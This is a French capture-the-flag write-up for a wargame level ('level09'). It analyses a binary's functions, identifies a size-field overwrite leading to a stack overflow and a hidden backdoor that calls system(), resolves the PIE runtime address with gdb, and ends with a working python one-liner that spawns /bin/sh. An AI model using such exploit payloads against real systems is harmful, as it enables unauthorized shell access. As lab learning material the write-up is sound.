
---

# Explications détaillées

### 1. Fonction `secret_backdoor`

* Lit une commande via `fgets` sur stdin (128 caractères max).
* Exécute cette commande via `system()`.
* **C’est une porte dérobée** : si on parvient à appeler cette fonction, on peut exécuter n’importe quelle commande shell, ce qui est très dangereux.

---

### 2. Fonction `set_username`

* Demande à l’utilisateur d’entrer un nom d’utilisateur (username).
* Lit jusqu’à 140 caractères (avec fgets).
* Copie jusqu’à 40 caractères de ce username dans le buffer passé en argument, **à partir de l’offset 140**.
* Affiche un message de bienvenue avec le username.

---

### 3. Fonction `set_message`

* Demande un message à l’utilisateur (jusqu’à 1024 caractères).
* Lit ce message avec fgets.
* Copie ce message dans le buffer à l’adresse donnée, avec une limite définie par la valeur d’entier stockée dans `buffer + 180`.
* **Important** : la taille max pour la copie du message est déterminée par un int stocké dans le buffer, ce qui peut être un vecteur d’attaque (dépend du contenu à cette adresse).

---

### 4. Fonction `handle_msg`

* Initialise un buffer de 140 octets (ici nommé `buffer`).
* Initialise aussi plusieurs variables à 0, mais elles ne semblent pas utilisées.
* Initialise une variable `max_len` à 140.
* **Stocke `max_len` à l’adresse `buffer + 180`**, c’est important pour la limite dans `set_message`.
* Appelle `set_username(buffer)` pour demander un username et le copier à `buffer+140`.
* Appelle `set_message(buffer)` pour demander un message qui sera copié dans `buffer` avec une taille max de 140 (stocké plus haut).
* Affiche "Msg sent!".

---

### 5. Fonction `main`

* Affiche un message de bienvenue.
* Lance `handle_msg()`.
* Termine.

---

# Analyse globale

* Le programme demande un username et un message.
* Il stocke le username dans une zone **au-delà** du buffer principal (offset +140).
* Il utilise une taille max pour copier le message stockée dans le buffer même (à l’offset 180), ce qui dépasse la taille initiale de `buffer[140]`.
* Cette manipulation d’adresses hors des limites du buffer principal peut provoquer des **vulnérabilités de type dépassement de tampon (buffer overflow)**.
* La fonction `secret_backdoor` est **une porte cachée**, qui, si appelée (par un débordement par exemple), permet d’exécuter n’importe quelle commande shell.
* L’exploitation probable consiste à déborder le buffer dans `handle_msg` pour écraser le retour de fonction ou un pointeur de fonction et appeler `secret_backdoor`, avec une chaine "/bin/sh" et ca devrait etre bon. Partons a la recherche des adresse correspondantes et l'offset pour l'overflow.

---

Entrée 1 (username) :

40 caractères utiles

1 octet (\xff) pour augmenter artificiellement la taille de copie

→ dépassement autorisé dans set_msg()

Entrée 2 (message) :

Chaîne très longue qui déborde et écrase RIP

→ saut vers secret_backdoor()

Appel de system() via fgets()

Tu tapes /bin/sh → shell



L'adresse trouver avec gdb pour secret backdoor est : 

Mais apres de multiple essaie elle ne fonctionne pas on a donc chercher encore et on est tomber sur ca :

(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r
Starting program: /home/users/level09/level09 

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) p secret_backdoor 
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>


Nouvelle adresse : 0x55555555488c


Pourquoi ? Car cette adresse n’est pas celle utilisée à l’exécution puisque :

PIE enabled (Position Independent Executable)
✅ C’est ce point précisément qui explique pourquoi l’adresse de secret_backdoor() varie à l’exécution.

Un binaire PIE est compilé de manière à ce que son segment .text (code) puisse être chargé à une adresse aléatoire à chaque exécution.

Ça veut dire que 0x000000000000088c dans le binaire devient, par exemple, 0x55555555488c à l’exécution.

Donc tu ne peux pas hardcoder l'adresse de secret_backdoor dans ton exploit sans d’abord la connaître dynamiquement


Reste a trouver le 200 apres le B

(python -c 'print "A" * 40 + "\xff" + "\n" + "B"* 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh" + "\n"'; cat) | ./level09